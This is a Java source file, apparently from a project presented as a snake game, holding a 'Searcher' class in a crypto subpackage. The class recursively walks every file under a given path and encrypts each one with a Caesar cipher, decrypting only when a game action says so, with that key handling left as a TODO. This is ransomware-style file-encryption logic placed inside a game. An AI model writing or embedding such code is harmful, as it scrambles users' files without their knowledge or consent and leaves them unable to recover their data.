package me.herrlestrate.snakegame.crypto;

import me.herrlestrate.snakegame.Game;

import java.io.File;
import java.util.Objects;

public class Searcher {

    public Searcher(){

    }

    public void start(String startPath){
        for(File target : Objects.requireNonNull((new File(startPath)).listFiles())){
            if(target.isDirectory()){
                start(target.getAbsolutePath());
                continue;
            }

            if(Game.getAction().equalsIgnoreCase("decrypt")){
                //TODO get data for decrypt
                new Caesar().decryptFile(target,new String[]{});
            } else {
                new Caesar().encryptFile(target);
            }
        }
    }
}
